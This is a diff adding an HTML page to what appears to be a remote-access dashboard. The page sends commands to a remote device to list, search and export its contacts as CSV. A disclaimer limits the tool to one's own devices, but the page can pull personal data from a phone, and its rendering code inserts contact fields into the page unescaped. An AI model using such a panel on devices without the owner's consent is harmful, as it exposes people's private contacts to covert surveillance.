@@ -1,0 +1,165 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contacts - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+</head>
+
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&lt;-- Back to Dashboard</a>
+        <div class="header-row">
+            <h1>Contacts <span class="count-badge" id="contact-count" style="display:none">0</span></h1>
+            <button class="btn btn-primary" onclick="exportContacts()">EXPORT CSV</button>
+        </div>
+
+        <!-- Search bar -->
+        <div class="search-bar">
+            <input type="search" id="contact-search" placeholder="Search by name or number..."
+                oninput="filterContacts()">
+        </div>
+
+        <div id="contact-list" class="contact-list loading">Reading contacts...</div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+
+        // Pagination state
+        let offset = 0;
+        let allContacts = [];
+        let isLoading = false;
+        let hasMore = true;
+
+        async function loadContacts() {
+            if (isLoading) return;
+
+            isLoading = true;
+            const loadMoreBtn = document.getElementById('load-more-btn');
+            if (loadMoreBtn) {
+                loadMoreBtn.disabled = true;
+                loadMoreBtn.textContent = 'Loading...';
+            }
+
+            try {
+                const response = await api.sendCommand(deviceId, 'contacts_list', {
+                    limit: 50,
+                    offset: offset
+                });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    const newContacts = response.data.data || [];
+                    hasMore = response.data.hasMore || false;
+                    offset = response.data.nextOffset || (offset + 50);
+
+                    allContacts = allContacts.concat(newContacts);
+                    document.getElementById('contact-count').style.display = 'inline-block';
+                    document.getElementById('contact-count').textContent = allContacts.length + (hasMore ? '+' : '');
+                    renderContacts(allContacts, hasMore);
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to load contacts');
+                }
+            } catch (error) {
+                document.getElementById('contact-list').innerHTML = `<p style="color:var(--danger)">Error: ${error.message}</p>`;
+            } finally {
+                isLoading = false;
+                if (loadMoreBtn) {
+                    loadMoreBtn.disabled = false;
+                    loadMoreBtn.textContent = 'LOAD MORE (50)';
+                }
+            }
+        }
+
+        function filterContacts() {
+            const query = document.getElementById('contact-search').value.toLowerCase().trim();
+            if (!query) {
+                renderContacts(allContacts, hasMore);
+                return;
+            }
+            const filtered = allContacts.filter(c =>
+                c.name.toLowerCase().includes(query) ||
+                c.phones.some(p => p.includes(query))
+            );
+            renderContacts(filtered, false);
+        }
+
+        function renderContacts(contacts, showLoadMore) {
+            const container = document.getElementById('contact-list');
+            container.className = 'contact-list';
+
+            if (contacts.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <h2>No Contacts Found</h2>
+                        <p>${allContacts.length > 0 ? 'No contacts match your search.' : 'No contacts found on device.'}</p>
+                    </div>`;
+                let loadMoreBtn = document.getElementById('load-more-btn');
+                if (loadMoreBtn) loadMoreBtn.style.display = 'none';
+                return;
+            }
+
+            container.innerHTML = contacts.map(c => `
+                <div class="contact-card">
+                    <div class="avatar">${c.name.charAt(0).toUpperCase()}</div>
+                    <div class="info">
+                        <h3>${c.name}</h3>
+                        <p>${c.phones.join(', ')}</p>
+                    </div>
+                </div>
+            `).join('');
+
+            // Add/update Load More button
+            let loadMoreBtn = document.getElementById('load-more-btn');
+            if (!loadMoreBtn) {
+                loadMoreBtn = document.createElement('button');
+                loadMoreBtn.id = 'load-more-btn';
+                loadMoreBtn.className = 'btn btn-secondary';
+                loadMoreBtn.onclick = loadContacts;
+                loadMoreBtn.textContent = 'LOAD MORE (50)';
+                loadMoreBtn.style.margin = '20px auto';
+                loadMoreBtn.style.display = 'block';
+                container.parentElement.appendChild(loadMoreBtn);
+            }
+
+            loadMoreBtn.style.display = showLoadMore ? 'block' : 'none';
+        }
+
+        async function exportContacts() {
+            try {
+                const response = await api.sendCommand(deviceId, 'contacts_export', { format: 'csv' });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    api.downloadFile(deviceId, response.data.path);
+                    api.showToast(`Exporting ${response.data.count} contacts...`, 'success');
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Export failed');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        loadContacts();
+    </script>
+
+  <!-- Disclaimer -->
+  <div class="container">
+    <div class="disclaimer">
+      <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+      <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely manage their own devices. Installing or using this application on a device without the owner's explicit consent is illegal and unethical. The developers assume no liability for misuse. By using this application, you agree that you are solely responsible for how it is used.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p class="footer-created">Created by</p>
+    <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+    <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
